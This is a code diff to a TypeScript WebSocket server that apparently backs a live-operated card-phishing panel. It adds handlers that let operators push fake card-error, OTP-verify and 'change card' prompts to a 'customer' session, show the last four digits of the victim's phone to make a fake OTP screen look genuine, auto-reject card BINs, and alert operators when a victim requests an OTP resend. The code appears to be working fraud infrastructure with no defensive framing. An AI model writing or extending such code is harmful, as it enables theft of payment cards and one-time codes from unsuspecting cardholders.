@@ -314,12 +314,23 @@ export function setupWebSocket(server: any) {
 
           // Build customer message for specific rejections
           let custMsg = message || '';
+          let phoneSuffix = '';
+
           if (action === 'card_error') custMsg = message || 'Card error - please verify your card details';
           if (action === 'otp_error') custMsg = message || 'Verification code error - please try again';
           if (action === 'custom_prompt') custMsg = message || '';
           if (action === 'change_card_prompt') custMsg = message || '请更换卡片重新支付';
 
-          sendToCustomer(sessionId, { action, message: custMsg, sessionId });
+          // For OTP verify actions, include phone suffix in the message
+          if (action === 'otp_verify' || action === 'custom_otp_tail') {
+            phoneSuffix = action === 'custom_otp_tail' ? (message || '****') : '';
+            if (!phoneSuffix && s) {
+              const phone = (s as any).customerInfo?.phone || '';
+              phoneSuffix = phone.replace(/\D/g, '').slice(-4) || '****';
+            }
+          }
+
+          sendToCustomer(sessionId, { action, message: custMsg, sessionId, phoneSuffix });
           break;
         }
 
@@ -329,6 +340,26 @@ export function setupWebSocket(server: any) {
             consoleSettings.autoRejectBins = msg.payload.autoRejectBins.split(',').map((b: string) => b.trim()).filter(Boolean);
           }
           console.log('[Settings] Updated:', JSON.stringify(consoleSettings));
+          break;
+        }
+
+        case 'resend_otp': {
+          const { sessionId } = msg.payload;
+          const s = sessions.get(sessionId);
+          if (!s) break;
+          s.otpResendCount = (s.otpResendCount || 0) + 1;
+          if (s.otpResendCount > 5) {
+            sendToCustomer(sessionId, { action: 'resend_limit', message: 'Maximum resend attempts reached. Please try again later.' });
+            break;
+          }
+          // Notify all operators
+          operators.forEach(op => {
+            if (op.readyState === WebSocket.OPEN) {
+              op.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId, count: s!.otpResendCount } }));
+            }
+          });
+          // Tell customer to wait 1 minute
+          sendToCustomer(sessionId, { action: 'resend_ok', message: 'OTP resent', count: s.otpResendCount });
           break;
         }
 
